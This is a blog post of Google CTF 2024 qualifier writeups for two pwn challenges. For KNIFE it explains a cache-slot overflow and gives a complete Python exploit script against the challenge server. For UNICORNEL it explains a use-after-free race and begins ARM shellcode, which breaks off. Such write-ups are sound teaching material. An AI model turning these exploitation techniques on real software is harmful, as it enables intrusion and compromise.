---
title: Google CTF 2024 Quals Writeups
url: https://ptr-yudai.hatenablog.com/entry/2024/07/09/115940
source: CTFするぞ
date: 2024-07-10
fetch_date: 2025-10-06T17:42:36.628184
---

# Google CTF 2024 Quals Writeups

[![CTFするぞ](https://cdn.image.st-hatena.com/image/square/994ee0e012cf90178bff014bfd99123c02a89b36/backend=imagemagick;height=128;version=1;width=128/https%3A%2F%2Fcdn.user.blog.st-hatena.com%2Fblog_custom_icon%2F153103571%2F1535456424487441)](https://ptr-yudai.hatenablog.com/)

[CTFするぞ](https://ptr-yudai.hatenablog.com/)

[読者になる](https://blog.hatena.ne.jp/ptr-yudai/ptr-yudai.hatenablog.com/subscribe?utm_medium=button&utm_campaign=subscribe_blog&utm_source=blogs_topright_button)

# [CTFするぞ](https://ptr-yudai.hatenablog.com/)

## CTF以外のことも書くよ

[2024-07-09](https://ptr-yudai.hatenablog.com/archive/2024/07/09)

# [Google CTF 2024 Quals Writeups](https://ptr-yudai.hatenablog.com/entry/2024/07/09/115940)

[CTF](https://ptr-yudai.hatenablog.com/archive/category/CTF)
[Writeup](https://ptr-yudai.hatenablog.com/archive/category/Writeup)

I played this year's [Google](https://d.hatena.ne.jp/keyword/Google) CTF in kijitora.
Luckily I managed to solve some tasks so I'll dump my solutions here.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240709/20240709115914.png)

# [Pwn 215pt] KNIFE

We're given an [x86-64](https://d.hatena.ne.jp/keyword/x86-64) ELF program.
It can convert message from and to some encodings: plain, hex, or ascii 85.

The program has 10 slot of caches.
Each cache has a SHA256 of the plaintext as a key, and 6 sub-caches as values.
The sub-cache has an encoding result of the plaintext.

i.e.

```
Awaiting command...
hex a85 41414242
Success. Result: 7}9PL
Awaiting command...
hex a85 41414242
Serving from cache. Result: 7}9PL
```

The flag is cached when the program starts.
However, since the cache is looked up by SHA256 [value](https://d.hatena.ne.jp/keyword/value) of our input, there's no way we can leak the flag.

The [vulnerability](https://d.hatena.ne.jp/keyword/vulnerability) lies in the sub-cache system.
Each cache can hold up to 6 sub-caches, but it can write data to the 7th slot when all of the 6 slots are in use.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240709/20240709095109.png)

The cache is simply an array of the following structure.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240709/20240709095344.png)

So, if it tries to use the 7th slot, we actually overwrite the SHA256 of the next cache.
Obviously, the goal is to overwrite the SHA256 of the cached flag so that we can read the encoded flag through the cache.

The problem is, however, we cannot simply use up the 6 slots because the program only supports 3 types of encodings.
In other words, we need either multiple different encoded texts that decodes to the same message, or a message that encodes to multiple different encoded texts.

Ascii 85 encodes data to an ascii text of the length in multiple of 5 bytes.
Each 4-byte block of the data is encoded to 5-byte text.

If the length of the last block is not a multiple of 4 bytes, padding is added to the data in the following way:

* 1 byte left: 0x010100??
* 2 bytes left: 0x0100????
* 3 bytes left: 0x00??????

If you carefully reverse engineer the decoding function of ascii 85, you'll notice that the decoding process does not terminate even after it encounters the padding.
It means that if we concatenate multiple ascii 85 texts, it successfully decodes to the two messages concatenated.

Using this feature, I could poison the SHA256 [value](https://d.hatena.ne.jp/keyword/value) of the cached flag.

```
import hashlib
from ptrlib import *

alphabet = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~'

def a85(block: int):
    assert block <= 0x1_010100FF
    output  = alphabet[block % 0x55]
    block //= 0x55
    output += alphabet[block % 0x55]
    block //= 0x55
    output += alphabet[block % 0x55]
    block //= 0x55
    output += alphabet[block % 0x55]
    block //= 0x55
    output += alphabet[block % 0x55]
    return output

def command(fmt_from: str, fmt_to: str, data: str | bytes):
    cmd = f"{fmt_from} {fmt_to} {bytes2str(data)}"
    sock.sendlineafter("Awaiting command...\n", cmd)

#sock = Process("./chal")
sock = Socket("knife.2024.ctfcompetition.com 1337")

while True:
    key = os.urandom(16)
    if b'\x00' in key: continue
    target = hashlib.sha256(key).hexdigest()
    if target.startswith('a85'): break

logger.info("key: " + key.hex())
logger.info("target: " + target)

for i in range(8):
    command("plain", "plain", "A"*(i+1))

fixed = target[3:] + "0000"
a = fixed + a85(0x0_41414141) + a85(0x0_41414141) + a85(0x1_01010041)
b = fixed + a85(0x0_41414141) + a85(0x1_00414141) + a85(0x1_01004141)
c = fixed + a85(0x0_41414141) + a85(0x1_01004141) + a85(0x1_00414141)
d = fixed + a85(0x0_41414141) + a85(0x1_01010041) + a85(0x0_41414141)
e = fixed + a85(0x1_00414141) + a85(0x1_01004141) + a85(0x0_41414141)
f = fixed + a85(0x1_01004141) + a85(0x1_00414141) + a85(0x0_41414141)

command("a85", "plain", a)
command("a85", "plain", b)
command("a85", "plain", c)
command("a85", "plain", d)
command("a85", "plain", e)
command("a85", "plain", f)

command("plain", "plain", key)

sock.sh()
```

# [Pwn 320pt] UNICORNEL

Unicornel is an emulator using the [unicorn](https://d.hatena.ne.jp/keyword/unicorn) engine.
It has multiple threads that can emulate programs for different architectures at once.

Each thread creates distinct [unicorn](https://d.hatena.ne.jp/keyword/unicorn) context, but it can share memory mapping with other architecture using `create_shared` and `map_shared` system call.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240709/20240709102334.png)

There are some other interesting system calls implemented.

`bookmark` system call can save the current [unicorn](https://d.hatena.ne.jp/keyword/unicorn) context and `unicorn_rewind` can restore the state.
`switch_arch` is more unique. It can change the architecture running the current code.

The [vulnerability](https://d.hatena.ne.jp/keyword/vulnerability) lies in the locking mechanism of shared mapping. (Thanks [@moratorium08](https://twitter.com/moratorium08) for pointing out the bug!)
Shared memory has a reference counter that increments when mapped, and decrements when unmapped.
When the counter becomes 1, the shared buffer is no longer necessary and freed.

You can see that `unmap` takes mutex when decrementing the counter.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240709/20240709102926.png)

However, `unicornel_rewind` does not acquire lock at all.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240709/20240709103106.png)

When two threads tries to call `mmap` and `rewind` at the same timing, the shared buffer can be freed and thus use-after-free can occur.

What can we overwrite once use-after-free occurs?

`switch_arch` creates a new [unicorn](https://d.hatena.ne.jp/keyword/unicorn) context, which allocates `uc_engine`.
`uc_engine` has a lot of function pointers and is a good target for use-after-free[\*1](#f-a6bb1433 "This was obvious for me since I made a similar pwn challenge to overwrite uc_engine in BlackHat MEA Finals").

The annoying part is that we have to write these 3 things in 3 different architectures.
This is because we cannot run programs of the same architecture at the same time due to the limit of this challenge. ([TBH](https://d.hatena.ne.jp/keyword/TBH) I hate this kind of meaningless restriction.)

Again, [@moratorium08](https://twitter.com/moratorium08) helped me to convert my shellcode into [MIPS](https://d.hatena.ne.jp/keyword/MIPS), so it was stress-free for me :)

ARM (data race)

```
_start:
  ldr x0, =0x80003000
  mov sp, x0

  mov x1, 0
  bl Resume

  bl Bookmark

Lp:
  mov x3, 0
  mov x2, 0x1000
  ldr x1, =0xdead0000
  bl MapShared
  cbnz x0, Lp
  ldr x0, [x1]
  cbnz x0, Ok
  bl Rewind

Ok:
  mov x1, 111
  bl PrintInteger

a: b a

  bl Exit

// x1 = address
// --> returns 1 if mapped
IsMapped:
  mov x2, 1
  mov x0, 1
  svc #0
  cmp x0, #1
  cset x0, eq
  ret

Exit:
  mov x0, 0
  svc #...